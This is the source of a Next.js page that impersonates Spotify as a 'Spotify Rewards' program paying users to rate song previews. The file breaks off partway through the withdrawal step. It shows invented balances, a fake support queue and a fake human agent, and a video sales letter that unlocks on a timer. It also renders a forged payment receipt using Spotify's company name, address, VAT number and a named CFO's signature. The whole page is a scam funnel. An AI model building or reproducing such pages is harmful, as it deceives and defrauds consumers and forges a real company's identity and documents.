// TypeScript / app/page.tsx / Next.js App Router / browser target
'use client';

import { motion } from 'framer-motion';
import { Check, CreditCard, Info, Pause, Play, Send, User, Volume2 } from 'lucide-react';
import Image from 'next/image';
import { memo, useEffect, useRef, useState } from 'react';
import MetaPixelTracker from '../../components/MetaPixelTracker';

type Song = {
  id: string;
  title: string;
  artist: string;
  cover: string;
  audioUrl: string;
  reward: number;
  questions: string[];
};

type Answers = Record<string, string | undefined>;

// 6 active songs in exact user-specified order and values (Total: $92.76)
const songs: Song[] = [
  {
    id: 'adele',
    title: 'Someone Like You',
    artist: 'Adele',
    cover: '/covers/adele-art.jpg',
    audioUrl: '/audio/adele-track.mp3',
    reward: 14.23,
    questions: [
      'Do you listen to Adele often?',
      'Do you usually listen to Someone Like You?',
    ],
  },
  {
    id: 'olivia',
    title: 'good 4 u',
    artist: 'Olivia Rodrigo',
    cover: '/covers/olivia-art.jpg',
    audioUrl: '/audio/olivia-track.mp3',
    reward: 10.68,
    questions: [
      'Do you listen to Olivia Rodrigo often?',
      'Do you usually listen to good 4 u?',
    ],
  },
  {
    id: 'weeknd',
    title: 'Blinding Lights',
    artist: 'The Weeknd',
    cover: '/covers/weeknd-art.jpg',
    audioUrl: '/audio/weeknd-track.mp3',
    reward: 18.47,
    questions: [
      'Do you listen to The Weeknd often?',
      'Do you usually listen to Blinding Lights?',
    ],
  },
  {
    id: 'dua-lipa',
    title: 'Levitating',
    artist: 'Dua Lipa',
    cover: '/covers/dua-lipa-art.jpg',
    audioUrl: '/audio/dua-lipa-track.mp3',
    reward: 12.91,
    questions: [
      'Do you listen to Dua Lipa often?',
      'Do you usually listen to Levitating?',
    ],
  },
  {
    id: 'harry-styles',
    title: 'As It Was',
    artist: 'Harry Styles',
    cover: '/covers/harry-styles-art.jpg',
    audioUrl: '/audio/harry-styles-track.mp3',
    reward: 17.36,
    questions: [
      'Do you listen to Harry Styles often?',
      'Do you usually listen to As It Was?',
    ],
  },
  {
    id: 'miley',
    title: 'Flowers',
    artist: 'Miley Cyrus',
    cover: '/covers/miley-art.jpg',
    audioUrl: '/audio/miley-track.mp3',
    reward: 19.11,
    questions: [
      'Do you listen to Miley Cyrus often?',
      'Do you usually listen to Flowers?',
    ],
  },
];

function BrandLogo({ dark = false }: { dark?: boolean }) {
  return (
    <div className={`logo ${dark ? 'logo-dark' : ''}`}>
      <Image
        className="logo-image"
        src="/spotify-logo.webp"
        alt="Spotify"
        width={34}
        height={34}
        priority
        referrerPolicy="no-referrer"
      />
      <b>Rewards</b>
    </div>
  );
}

function LoadingScreen({ onFinish }: { onFinish: () => void }) {
  const [progress, setProgress] = useState(0);
  const [queueStatus, setQueueStatus] = useState('Connecting to support server...');
  const onFinishRef = useRef(onFinish);
  onFinishRef.current = onFinish;
  const finishedRef = useRef(false);

  const complete = () => {
    if (finishedRef.current) return;
    finishedRef.current = true;
    setProgress(100);
    onFinishRef.current();
  };

  useEffect(() => {
    const startTime = Date.now();
    const duration = 8000; // 8 seconds progress bar fill

    const timer = setInterval(() => {
      const elapsed = Date.now() - startTime;
      const pct = Math.min(100, Math.floor((elapsed / duration) * 100));
      setProgress(pct);

      if (elapsed < 900) {
        setQueueStatus('Connecting to support server...');
      } else if (elapsed < 3100) {
        setQueueStatus('Your position in queue: #4');
      } else if (elapsed < 4400) {
        setQueueStatus('Your position in queue: #3');
      } else if (elapsed < 6300) {
        setQueueStatus('Your position in queue: #2');
      } else if (elapsed < 7400) {
        setQueueStatus('Your position in queue: #1');
      } else {
        setQueueStatus('Connecting to support representative...');
      }

      if (elapsed >= duration) {
        clearInterval(timer);
        setProgress(100);
        setQueueStatus('Connecting to support representative...');
        setTimeout(() => {
          complete();
        }, 800);
      }
    }, 30);

    // Hard safety timer (9.5s)
    const safetyTimer = setTimeout(() => {
      clearInterval(timer);
      complete();
    }, 9500);

    return () => {
      clearInterval(timer);
      clearTimeout(safetyTimer);
    };
  }, []);

  return (
    <div className="loading-screen">
      <div className="loading-inner">
        <div className="brand-line">
          <BrandLogo dark />
          <span />
          <small>CASHOUT</small>
        </div>

        <div className="spinner" />

        <div className="flex flex-col items-center gap-1.5 min-h-[50px] justify-center">
          <h1 className="loading-title text-base font-bold text-gray-900 transition-all duration-300">
            {queueStatus}
          </h1>
          <span className="text-xs text-gray-500 font-medium tracking-wide">
            Please wait while we prepare your session...
          </span>
        </div>

        <div className="progress-track">
          <div className="progress-fill" style={{ width: `${progress}%` }} />
        </div>
      </div>
    </div>
  );
}

function ChatHeader({ balance }: { balance: number }) {
  return (
    <header className="chat-header">
      <div className="brand-line">
        <BrandLogo />
        <span />
        <small>CASHOUT</small>
      </div>
      <div className="balance-pill">${balance.toFixed(2)}</div>
    </header>
  );
}

function SpotifyAvatar() {
  return (
    <div className="chat-avatar" title="Spotify Rewards">
      <Image
        src="/spotify-logo.webp"
        alt="Spotify"
        width={44}
        height={44}
        priority
        referrerPolicy="no-referrer"
      />
    </div>
  );
}

function AgentAvatar() {
  return (
    <motion.div
      layoutId="kaitlynn-avatar"
      layout="position"
      transition={{
        type: 'spring',
        stiffness: 400,
        damping: 32,
        mass: 0.7,
      }}
      className="chat-avatar agent-chat-avatar"
      title="Kaitlynn W."
    >
      <Image
        src="/agent-avatar.jpg"
        alt="Kaitlynn"
        width={44}
        height={44}
        referrerPolicy="no-referrer"
      />
    </motion.div>
  );
}

function MessageBubble({
  children,
  showAvatar = true,
  isAgent = false,
}: {
  children: React.ReactNode;
  showAvatar?: boolean;
  isAgent?: boolean;
}) {
  return (
    <div className="msg-row msg-anim">
      {showAvatar && (isAgent ? <AgentAvatar /> : <SpotifyAvatar />)}
      <div className="msg-bubble">{children}</div>
    </div>
  );
}

function TypingIndicator({
  showAvatar = true,
  isAgent = false,
}: {
  showAvatar?: boolean;
  isAgent?: boolean;
}) {
  return (
    <div className="typing-row msg-anim">
      {showAvatar && (isAgent ? <AgentAvatar /> : <SpotifyAvatar />)}
      <div className="typing-bubble">
        <i />
        <i />
        <i />
      </div>
    </div>
  );
}

const PLAY_BEFORE_FADE_SECONDS = 8; // 8 seconds of playback preview before unlocking evaluation
const FADE_DURATION = 0.5; // Smooth fade out
const TOTAL_PLAY_TIME = PLAY_BEFORE_FADE_SECONDS + FADE_DURATION;
const VSL_2_DELAY_SECONDS = 150; // Exatamente 2:30 (150 segundos) após o envio da VSL 2

/* ======================================================== */
/* VTurb Smartplayer Component                              */
/* Preserva proporções (9:16 ou 16:9) e evita duplicações   */
/* ======================================================== */
const VturbPlayer = memo(function VturbPlayer({
  playerId,
  scriptSrc,
  aspectPadding = '56.25%',
  maxWidth = '100%',
}: {
  playerId: string;
  scriptSrc: string;
  aspectPadding?: string;
  maxWidth?: string;
}) {
  useEffect(() => {
    const scriptId = `vturb-script-${playerId}`;

    // Evita duplicar script em re-renderizações
    if (!document.getElementById(scriptId)) {
      const s = document.createElement('script');
      s.id = scriptId;
      s.src = scriptSrc;
      s.async = true;
      document.head.appendChild(s);
    }
  }, [playerId, scriptSrc]);

  return (
    <div
      className="vturb-player-box"
      style={{
        width: '100%',
        maxWidth,
        margin: '0 auto',
        borderRadius: 12,
        overflow: 'hidden',
        backgroundColor: '#000000',
      }}
      dangerouslySetInnerHTML={{
        __html: `
          <vturb-smartplayer id="vid-${playerId}" style="display:block;margin:0 auto;width:100%;max-width:${maxWidth};">
            <div class="vturb-player-placeholder" style="position:relative;width:100%;padding:${aspectPadding} 0 0;z-index:0;background-color:black;"></div>
          </vturb-smartplayer>
        `,
      }}
    />
  );
});

function AudioPlayer({
  song,
  unlocked,
  onUnlock,
}: {
  song: Song;
  unlocked: boolean;
  onUnlock: () => void;
}) {
  const audioRef = useRef<HTMLAudioElement | null>(null);
  const fadeAnimRef = useRef<number | null>(null);
  const isFadingRef = useRef(false);
  const onUnlockRef = useRef(onUnlock);
  onUnlockRef.current = onUnlock;
  const unlockedRef = useRef(unlocked);
  unlockedRef.current = unlocked;

  const [playing, setPlaying] = useState(false);
  const [hasError, setHasError] = useState(false);
  const [currentTime, setCurrentTime] = useState(0);

  // Smooth gradual volume fade out strictly after playback threshold
  const startFadeOut = (audioEl: HTMLAudioElement) => {
    if (isFadingRef.current) return;
    isFadingRef.current = true;

    const startVol = audioEl.volume;
    const startTime = performance.now();
    const durationMs = FADE_DURATION * 1000;

    const step = () => {
      const elapsed = performance.now() - startTime;
      const progress = Math.min(1, elapsed / durationMs);

      // Smooth gradual fade: volume drops gently down to 0
      audioEl.volume = Math.max(0, startVol * Math.pow(1 - progress, 1.4));

      if (progress < 1) {
        fadeAnimRef.current = requestAnimationFrame(step);
      } else {
        audioEl.pause();
        audioEl.volume = 1;
        setPlaying(false);
        isFadingRef.current = false;
        fadeAnimRef.current = null;
      }
    };

    fadeAnimRef.current = requestAnimationFrame(step);
  };

  const togglePlay = async () => {
    const el = audioRef.current;
    if (!el) return;

    if (playing) {
      if (fadeAnimRef.current) {
        cancelAnimationFrame(fadeAnimRef.current);
        fadeAnimRef.current = null;
        isFadingRef.current = false;
      }
      el.pause();
      setPlaying(false);
    } else {
      try {
        if (!isFadingRef.current) {
          el.volume = 1;
        }
        await el.play();
        setPlaying(true);
      } catch (err) {
        console.warn('Audio playback error (browser policy / sandbox):', err);
        setHasError(true);
        onUnlockRef.current();
      }
    }
  };

  // Manage audio event listeners and track changes cleanly
  useEffect(() => {
    const el = audioRef.current;
    if (!el) return;

    // Reset track-specific state
    setPlaying(false);
    setHasError(false);
    setCurrentTime(0);
    isFadingRef.current = false;
    if (fadeAnimRef.current) {
      cancelAnimationFrame(fadeAnimRef.current);
      fadeAnimRef.current = null;
    }

    try {
      el.pause();
      el.currentTime = 0;
      el.volume = 1;
      el.load();
    } catch {}

    const onTimeUpdate = () => {
      const current = el.currentTime;
      setCurrentTime(current);

      // Unlocks evaluation strictly after required seconds!
      if (current >= PLAY_BEFORE_FADE_SECONDS) {
        if (!unlockedRef.current) {
          onUnlockRef.current();
        }
        if (!isFadingRef.current) {
          startFadeOut(el);
        }
      }
    };

    const onPlay = () => setPlaying(true);
    const onPause = () => setPlaying(false);
    const onError = () => {
      setHasError(true);
      onUnlockRef.current();
    };

    el.addEventListener('timeupdate', onTimeUpdate);
    el.addEventListener('play', onPlay);
    el.addEventListener('pause', onPause);
    el.addEventListener('error', onError);

    return () => {
      if (fadeAnimRef.current) {
        cancelAnimationFrame(fadeAnimRef.current);
        fadeAnimRef.current = null;
      }
      try {
        el.pause();
        el.currentTime = 0;
        el.volume = 1;
      } catch {}
      el.removeEventListener('timeupdate', onTimeUpdate);
      el.removeEventListener('play', onPlay);
      el.removeEventListener('pause', onPause);
      el.removeEventListener('error', onError);
    };
  }, [song.id]);

  const remainingSeconds = Math.max(1, Math.ceil(PLAY_BEFORE_FADE_SECONDS - currentTime));

  const noticeText = hasError
    ? '⚠️ Audio preview restricted by browser — questions unlocked below!'
    : unlocked
    ? '🎉 Preview completed! Answer the questions below and tap FINISH & EARN'
    : playing
    ? `🎵 Listen to the preview (${remainingSeconds}s remaining) to unlock evaluation.`
    : currentTime > 0
    ? `🎵 Paused (${remainingSeconds}s remaining). Press PLAY to finish listening.`
    : `🎵 Press PLAY to listen to the preview (${PLAY_BEFORE_FADE_SECONDS}s) and unlock evaluation.`;

  return (
    <>
      <audio
        key={song.id}
        ref={audioRef}
        src={song.audioUrl}
        preload="auto"
        onError={() => {
          setHasError(true);
          onUnlock();
        }}
      />

      <div className={`notice-banner ${unlocked ? 'is-unlocked' : ''}`}>
        {noticeText}
      </div>

      <div className={`track-player ${playing ? 'is-playing' : ''}`}>
        <div className="track-cover">
          <Image
            src={song.cover}
            alt={`${song.artist} cover`}
            fill
            sizes="56px"
            unoptimized
            priority
            referrerPolicy="no-referrer"
          />
        </div>

        <div className="track-meta">
          <b>{song.title}</b>
          <div>
            <em>PREVIEW</em>
            <small>{song.artist}</small>
          </div>
        </div>

        <button
          type="button"
          className="play-btn"
          onClick={togglePlay}
          aria-label={playing ? 'Pause preview' : 'Play preview'}
        >
          {playing ? (
            <Pause size={22} fill="currentColor" />
          ) : (
            <Play size={22} fill="currentColor" className="ml-0.5" />
          )}
        </button>
      </div>
    </>
  );
}

function MusicEvaluationBox({
  song,
  isConfirmed,
  lastReward,
  totalBalance = 92.76,
  isFinalSong = false,
  showAvatar = true,
  onComplete,
}: {
  song: Song;
  isConfirmed: boolean;
  lastReward: number;
  totalBalance?: number;
  isFinalSong?: boolean;
  showAvatar?: boolean;
  onComplete: (amount: number) => void;
}) {
  const [unlocked, setUnlocked] = useState(false);
  const [answers, setAnswers] = useState<Answers>({});

  // Reset unlocked state and answers when advancing to the next song
  useEffect(() => {
    setUnlocked(false);
    setAnswers({});
  }, [song.id]);

  const isReady = unlocked && song.questions.every((_, idx) => answers[idx]);

  return (
    <div className="card-shell msg-anim music-eval-shell">
      {showAvatar && <SpotifyAvatar />}

      {isConfirmed ? (
        isFinalSong ? (
          <div className="final-double-card msg-anim">
            <div className="final-top-box">
              <span className="emoji" role="img" aria-label="party">🎉</span>
              <h3 className="top-title">Jobs Completed!</h3>
              <p className="top-text">
                You just earned your payout for completing today&apos;s evaluation jobs!
                <br />
                Continue in the chat below to withdraw your
              </p>
              <strong className="top-amount">${totalBalance.toFixed(2)}</strong>
            </div>

            <div className="final-bottom-box">
              <div className="check-icon">
                <Check size={28} strokeWidth={3} />
              </div>
              <b>Evaluation Submitted!</b>
              <small>BALANCE RECEIVED</small>
              <strong>+${lastReward.toFixed(2)}</strong>
            </div>
          </div>
        ) : (
          <div className="success-card msg-anim">
            <div className="check-icon">
              <Check size={28} strokeWidth={3} />
            </div>
            <b>Evaluation Submitted!</b>
            <span className="success-track-title">
              {song.title} • {song.artist}
            </span>
            <small>BALANCE RECEIVED</small>
            <strong>+${lastReward.toFixed(2)}</strong>

            <div className="next-song-loader">
              <div className="mini-spinner" />
              <span>Loading next song...</span>
            </div>
          </div>
        )
      ) : (
        <div className="eval-card msg-anim" key={song.id}>
          <AudioPlayer
            song={song}
            unlocked={unlocked}
            onUnlock={() => setUnlocked(true)}
          />

          <div className="questions-list">
            {song.questions.map((question, idx) => (
              <div className="question-block" key={question}>
                <b>{question}</b>
                <div className="options-grid">
                  {['Yes', 'No'].map((opt) => (
                    <button
                      key={opt}
                      type="button"
                      disabled={!unlocked}
                      className={`opt-btn ${
                        answers[idx] === opt ? 'selected' : ''
                      }`}
                      onClick={() =>
                        setAnswers((prev) => ({ ...prev, [idx]: opt }))
                      }
                    >
                      {opt}
                    </button>
                  ))}
                </div>
              </div>
            ))}
          </div>

          <button
            type="button"
            className={`finish-btn ${isReady ? 'ready' : ''}`}
            disabled={!isReady}
            onClick={() => onComplete(song.reward)}
          >
            FINISH &amp; EARN
          </button>
        </div>
      )}
    </div>
  );
}

function DemoSummaryCard({
  balance,
  totalSongs,
  showAvatar = true,
}: {
  balance: number;
  totalSongs: number;
  showAvatar?: boolean;
}) {
  return (
    <div className="card-shell msg-anim summary-card-shell">
      {showAvatar && <SpotifyAvatar />}
      <DemoSummary balance={balance} totalSongs={totalSongs} />
    </div>
  );
}

function DemoSummary({
  balance,
  totalSongs,
}: {
  balance: number;
  totalSongs: number;
}) {
  return (
    <section className="demo-summary-box msg-anim">
      <div className="summary-header">
        <Image
          src="/spotify-logo.webp"
          alt="Spotify"
          width={22}
          height={22}
          referrerPolicy="no-referrer"
        />
        <strong>Rewards</strong>
        <span className="tag">DEMO</span>
      </div>

      <div className="summary-banner">BALANCE SUMMARY</div>

      <div className="summary-content">
        <div className="summary-parties">
          <div>
            <b>ACTIVITY</b>
            <strong>Music evaluation jobs</strong>
            <span>Rewards session</span>
          </div>
          <div>
            <b>COMPLETED JOBS</b>
            <strong>{totalSongs} jobs completed</strong>
          </div>
        </div>

        <div className="summary-grid">
          <span className="th">Description</span>
          <span className="th">Jobs</span>
          <span className="th">Balance</span>
          <span>Music evaluation jobs</span>
          <span>{totalSongs}</span>
          <strong>${balance.toFixed(2)}</strong>
        </div>

        <div className="summary-total">
          <span>ACCUMULATED BALANCE</span>
          <strong>${balance.toFixed(2)}</strong>
        </div>
      </div>

      <div className="summary-footer">
        <Image
          src="/spotify-logo.webp"
          alt="Spotify"
          width={24}
          height={24}
          referrerPolicy="no-referrer"
        />
      </div>
    </section>
  );
}

function UserBubble({ children }: { children: React.ReactNode }) {
  return (
    <div className="user-msg-row msg-anim">
      <div className="user-bubble">{children}</div>
    </div>
  );
}

function PaymentReceipt({
  userName,
  totalAmount = 92.76,
  refNumber = 'SP-424467',
  showAvatar = true,
}: {
  userName: string;
  totalAmount?: number;
  refNumber?: string;
  showAvatar?: boolean;
}) {
  return (
    <div className="receipt-shell msg-anim">
      {showAvatar && <AgentAvatar />}
      <div className="receipt-card">
        {/* Black Top Header */}
        <div className="receipt-header">
          <div className="brand">
            <Image
              src="/spotify-logo.webp"
              alt="Spotify"
              width={22}
              height={22}
              referrerPolicy="no-referrer"
            />
            <span>Spotify Rewards</span>
          </div>
          <span className="ref">Ref.: {refNumber}</span>
        </div>

        {/* Green Sub-Header */}
        <div className="receipt-banner">PAYMENT RECEIPT</div>

        {/* FROM / TO Metadata */}
        <div className="receipt-meta-grid">
          <div className="receipt-meta-col">
            <span className="label">FROM:</span>
            <b>Spotify Media Service AB</b>
            <span>Regeringsgatan 19</span>
            <span>Stockholm, Sweden</span>
            <span className="vat">VAT: SE556703748501</span>
          </div>
          <div className="receipt-meta-col to-col">
            <span className="label">TO:</span>
            <b>{userName || 'MEU NOME'}</b>
          </div>
        </div>

        {/* Items Table */}
        <div className="receipt-table">
          <div className="receipt-table-header">
            <span className="col-desc">Description</span>
            <span className="col-qty">Qty.</span>
            <span className="col-total">Total</span>
          </div>
          <div className="receipt-table-row">
            <span className="col-desc">
              Payment for music track evaluations / SoundRate
            </span>
            <span className="col-qty">6</span>
            <span className="col-total">${totalAmount.toFixed(2)}</span>
          </div>
        </div>

        <div className="receipt-divider" />

        {/* Total Paid Row */}
        <div className="receipt-total-bar">
          <span>TOTAL PAID</span>
          <strong>${totalAmount.toFixed(2)}</strong>
        </div>

        {/* Signature & Issuance Info */}
        <div className="receipt-sign-grid">
          <div className="receipt-doc-info">
            <b>Ref.: {refNumber}</b>
            <span>Issued: 11/03/2026</span>
            <small>
              Document electronically issued.
              <br />
              Valid without physical signature.
            </small>
          </div>
          <div className="receipt-signature-box">
            <span className="cursive-sign">Christian Luiga</span>
            <div className="sign-line" />
            <span className="sign-title">Chief Financial Officer (CFO)</span>
            <span className="sign-company">Spotify Media Service AB</span>
          </div>
        </div>

        {/* Payment Method & Notice Box */}
        <div className="receipt-notice-box">
          <div className="pay-method">
            <CreditCard size={15} />
            <span>Payment method: Bank transfer</span>
          </div>
          <div className="notice-inner">
            <Info size={14} className="text-[#1db954] shrink-0 mt-0.5" />
            <span>
              <b>Notice:</b> The funds will be deposited to the credit card
              registered on the platform.
            </span>
          </div>
        </div>

        {/* Green Bottom Brand Bar */}
        <div className="receipt-bottom-bar">
          <Image
            src="/spotify-logo.webp"
            alt="Spotify"
            width={24}
            height={24}
            referrerPolicy="no-referrer"
          />
        </div>
      </div>
    </div>
  );
}

/* ======================================================== */
/* (AQUI É A VSL 2) - Componente do Segundo Vídeo (VTurb)   */
/* Horizontal 16:9 - Integrada, limpa e avança ao terminar  */
/* ======================================================== */
function VslVideoPlayer({
  onUnlock,
  unlocked,
  showAvatar = true,
}: {
  onUnlock: () => void;
  unlocked: boolean;
  showAvatar?: boolean;
}) {
  const hasTriggeredRef = useRef(false);
  const onUnlockRef = useRef(onUnlock);
  onUnlockRef.current = onUnlock;

  const triggerUnlock = () => {
    if (!hasTriggeredRef.current) {
      hasTriggeredRef.current = true;
      onUnlockRef.current();
    }
  };

  useEffect(() => {
    if (unlocked) return;

    // Dispara a próxima etapa exatamente 2:30 (150 segundos) após o envio da VSL 2
    const exactTimer = setTimeout(() => {
      triggerUnlock();
    }, VSL_2_DELAY_SECONDS * 1000);

    // Escuta eventos postMessage emitidos pelo iframe/player do VTurb ao concluir
    const handleMessage = (e: MessageEvent) => {
      try {
        let msg = e.data;
        if (typeof msg === 'string') {
          try {
            msg = JSON.parse(msg);
          } catch {
            if (msg.includes('ended') || msg.includes('complete')) {
              triggerUnlock();
              return;
            }
          }
        }
        if (msg) {
          const evt = msg.event || msg.type || msg.action || msg.status || msg.name;
          if (
            evt === 'ended' ||
            evt === 'video:ended' ||
            evt === 'smartplayer:ended' ||
            evt === 'completed' ||
            msg.isEnded === true ||
            msg?.data?.event === 'ended'
          ) {
            triggerUnlock();
          }
        }
      } catch {}
    };

    window.addEventListener('message', handleMessage);

    // Escuta eventos customizados de encerramento do VTurb
    const handleCustomEnded = () => triggerUnlock();
    window.addEventListener('smartplayer:ended', handleCustomEnded);
    document.addEventListener('smartplayer:ended', handleCustomEnded);

    // Conecta diretamente à instância global do smartplayer quando estiver pronta
    let pollInterval: NodeJS.Timeout | null = null;
    let pollCount = 0;
    const attachVturbInstance = () => {
      pollCount++;
      const sp = (window as any).smartplayer;
      if (sp && sp.instances && sp.instances.length > 0) {
        for (const inst of sp.instances) {
          if (inst && typeof inst.on === 'function') {
            try {
              inst.on('ended', () => {
                triggerUnlock();
              });
            } catch {}
          }
          if (inst && inst.video && typeof inst.video.addEventListener === 'function') {
            try {
              inst.video.addEventListener('ended', () => {
                triggerUnlock();
              });
            } catch {}
          }
        }
        return true;
      }
      return false;
    };

    if (!attachVturbInstance()) {
      pollInterval = setInterval(() => {
        if (attachVturbInstance() || pollCount > 120) {
          if (pollInterval) clearInterval(pollInterval);
        }
      }, 500);
    }

    return () => {
      clearTimeout(exactTimer);
      window.removeEventListener('message', handleMessage);
      window.removeEventListener('smartplayer:ended', handleCustomEnded);
      document.removeEventListener('smartplayer:ended', handleCustomEnded);
      if (pollInterval) clearInterval(pollInterval);
    };
  }, [unlocked]);

  return (
    /* (AQUI É A VSL 2) Container da VSL 2 - Integrada e limpa */
    <div className="card-shell msg-anim video-card-shell vsl-card-shell" style={{ padding: 0, overflow: 'hidden' }}>
      {showAvatar && <AgentAvatar />}
      <div className="video-card vsl-video-card vturb-card" style={{ padding: 0, margin: 0 }}>
        {/* Segunda VSL — horizontal, proporção 16:9, responsiva e sem cortes */}
        <VturbPlayer
          playerId="6aea9d2d755902dcbac7db3f"
          scriptSrc="https://scripts.converteai.net/8876e57a-2922-426e-83f1-74b43990df6f/players/6aea9d2d755902dcbac7db3f/v4/player.js"
          aspectPadding="56.25%"
          maxWidth="100%"
        />
      </div>
    </div>
  );
}

export default function Page() {
  const [loading, setLoading] = useState(true);
  const [balance, setBalance] = useState(0);
  const [displayBalance, setDisplayBalance] = useState(0);
  const [songIndex, setSongIndex] = useState(0);

  // In-place confirmation state for the single evaluation card (no extra bubbles/cards)
  const [isConfirmed, setIsConfirmed] = useState(false);
  const [lastReward, setLastReward] = useState(0);

  // Chat sequence state machine:
  // step 0: Typing 1
  // step 1: Msg 1 displayed
  // step 2: Typing 2
  // step 3: Msg 2 displayed
  // step 4: Typing 3
  // step 5: Msg 3 displayed
  // step 6: Typing 4
  // step 7: Music Evaluation Box displayed!
  const [chatStep, setChatStep] = useState(0);

  // Final stage sequence state machine:
  // 0: not started
  // 1: typing before Message 4 (Spotify)
  // 2: Message 4 visible (Spotify)
  // 3: typing before Message 5 (Spotify)
  // 4: Message 5 & Start Verification button visible (Spotify)
  // 5: typing for Kaitlynn (Agent)
  // 6: Kaitlynn joined message visible (Agent)
  // 7: typing before Video Card (Agent)
  // 8: Video Card visible (Agent)
  // 9: typing before Summary Card (Spotify)
  // 10: Summary Card visible (Spotify)
  const [finalStage, setFinalStage] = useState(false);
  const [finalPhase, setFinalPhase] = useState(0);

  // Verification & Receipt Funnel States
  const [hasClickedWithdraw, setHasClickedWithdraw] = useState(false);
  const [hasClickedYesIDo, setHasClickedYesIDo] = useState(false);
  const [userName, setUserName] = useState('');
  const [nameInput, setNameInput] = useState('');
  const [hasSubmittedName, setHasSubmittedName] = useState(false);
  const [hasClaimedReward, setHasClaimedReward] = useState(false);
  const [vslUnlocked, setVslUnlocked] = useState(false);
  const vslUnlockedRef = useRef(false);
  vslUnlockedRef.current = vslUnlocked;

  const [sessionId, setSessionId] = useState('809821');

  const cashAudioRef = useRef<HTMLAudioElement | null>(null);
  const scrollRef = useRef<HTMLDivElement | null>(null);
  const confirmTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const finalTimersRef = useRef<ReturnType<typeof setTimeout>[]>([]);

  const currentSong = songs[songIndex] || songs[0];

  const clearAllTimers = () => {
    if (confirmTimerRef.current) {
      clearTimeout(confirmTimerRef.current);
      confirmTimerRef.current = null;
    }
    finalTimersRef.current.forEach(clearTimeout);
    finalTimersRef.current = [];
  };

  // Initialize session ID and balance safely without crashing iframe storage
  useEffect(() => {
    try {
      if (typeof window !== 'undefined') {
        const savedCase = window.sessionStorage?.getItem('rewards-case');
        if (savedCase) {
          setSessionId(savedCase);
        } else {
          const generated = String(Math.floor(100000 + Math.random() * 899999));
          window.sessionStorage?.setItem('rewards-case', generated);
          setSessionId(generated);
        }

        const savedBal = window.sessionStorage?.getItem('rewards-balance');
        if (savedBal) {
          const val = Number(savedBal);
          if (!isNaN(val)) {
            setBalance(val);
            setDisplayBalance(val);
          }
        }
      }
    } catch {
      // Storage fallback
    }
  }, []);

  // Save balance safely
  useEffect(() => {
    try {
      if (typeof window !== 'undefined') {
        window.sessionStorage?.setItem('rewards-balance', String(balance));
      }
    } catch {
      // Storage fallback
    }
  }, [balance]);

  // Failsafe: Safety backstop if loading screen takes too long (12s limit)
  useEffect(() => {
    if (loading) {
      const failsafe = setTimeout(() => {
        setLoading(false);
      }, 12000);
      return () => clearTimeout(failsafe);
    }
  }, [loading]);

  // Step-by-step chat pacing (3-second typing intervals per message)
  useEffect(() => {
    if (loading) return;

    // Reset to step 0 when chat opens (Typing Indicator 1 appears)
    setChatStep(0);

    const timeouts = [
      setTimeout(() => setChatStep(1), 3000),  // Msg 1 arrives after 3s typing
      setTimeout(() => setChatStep(2), 3800),  // Typing 2 starts after 0.8s pause
      setTimeout(() => setChatStep(3), 6800),  // Msg 2 arrives after 3s typing
      setTimeout(() => setChatStep(4), 7600),  // Typing 3 starts after 0.8s pause
      setTimeout(() => setChatStep(5), 10600), // Msg 3 arrives after 3s typing
      setTimeout(() => setChatStep(6), 11400), // Typing 4 starts after 0.8s pause
      setTimeout(() => setChatStep(7), 14400), // Song card arrives after 3s typing!
    ];

    return () => {
      timeouts.forEach(clearTimeout);
    };
  }, [loading]);

  // Clean up all timers on unmount
  useEffect(() => {
    return () => {
      clearAllTimers();
    };
  }, []);

  // Reset entire flow
  const handleReset = () => {
    try {
      if (typeof window !== 'undefined') {
        window.sessionStorage?.removeItem('rewards-balance');
      }
    } catch {}
    clearAllTimers();
    setBalance(0);
    setDisplayBalance(0);
    setSongIndex(0);
    setIsConfirmed(false);
    setLastReward(0);
    setFinalStage(false);
    setFinalPhase(0);
    setHasClickedWithdraw(false);
    setHasClickedYesIDo(false);
    setUserName('');
    setNameInput('');
    setHasSubmittedName(false);
    setHasClaimedReward(false);
    setVslUnlocked(false);
    setLoading(true);
  };

  // Start the 3-second paced final messages sequence after 6th track evaluation
  const startFinalSequence = () => {
    setFinalPhase(1); // Typing before Message 4 (Spotify logo visible, 3s)

    const t1 = setTimeout(() => {
      setFinalPhase(2); // Message 4 arrives (Spotify logo hidden/gone)
    }, 3000);

    const t2 = setTimeout(() => {
      setFinalPhase(3); // Typing before Message 5 (Spotify logo returns, 3s)
    }, 3800);

    const t3 = setTimeout(() => {
      setFinalPhase(4); // Message 5 arrives (Spotify logo visible) + Start Verification button
    }, 6800);

    finalTimersRef.current.push(t1, t2, t3);
  };

  // User clicked Start Verification -> Kaitlynn sequence
  const handleStartVerification = () => {
    // Phase 6: Mensagem de entrada da Kaitlynn enviada imediatamente SEM a animação de digitando
    setFinalPhase(6);

    // Após 0.8s de pausa -> Phase 7: Typing for welcome message starts (3s)
    const t1 = setTimeout(() => {
      setFinalPhase(7);
    }, 800);

    // After 3s typing -> Phase 8: Welcome message "Hi, welcome to the Spotify Rewards!" arrives
    const t2 = setTimeout(() => {
      setFinalPhase(8);
    }, 3800);

    // After 0.8s pause -> Phase 9: Typing for Video Card starts (3s)
    const t3 = setTimeout(() => {
      setFinalPhase(9);
    }, 4600);

    // After 3s typing -> Phase 10: Video Card arrives
    const t4 = setTimeout(() => {
      setFinalPhase(10);
    }, 7600);

    // 15 full seconds of watching video -> Phase 11: Typing before Message 1 starts (3s)
    const t5 = setTimeout(() => {
      setFinalPhase(11);
    }, 22600);

    // After 3s typing -> Phase 12: Message 1 ("You have a balance of $92,76 in our app") arrives
    const t6 = setTimeout(() => {
      setFinalPhase(12);
    }, 25600);

    // After 0.8s pause -> Phase 13: Typing before Message 2 starts (3s)
    const t7 = setTimeout(() => {
      setFinalPhase(13);
    }, 26400);

    // After 3s typing -> Phase 14: Message 2 ("Would you like to continue so you can withdraw your money?") arrives
    const t8 = setTimeout(() => {
      setFinalPhase(14);
    }, 29400);

    // After 0.8s pause -> Phase 15: Typing before Message 3 starts (3s)
    const t9 = setTimeout(() => {
      setFinalPhase(15);
    }, 30200);

    // After 3s typing -> Phase 16: Message 3 "(Click the button below to continue)" + "Yes, I would like to withdraw" button arrives
    const t10 = setTimeout(() => {
      setFinalPhase(16);
    }, 33200);

    finalTimersRef.current.push(t1, t2, t3, t4, t5, t6, t7, t8, t9, t10);
  };

  // User clicked "Yes, I would like to withdraw"
  const handleWithdrawClick = () => {
    setHasClickedWithdraw(true);
    setFinalPhase(17); // Phase 17: Typing indicator (3s)

    const t1 = setTimeout(() => {
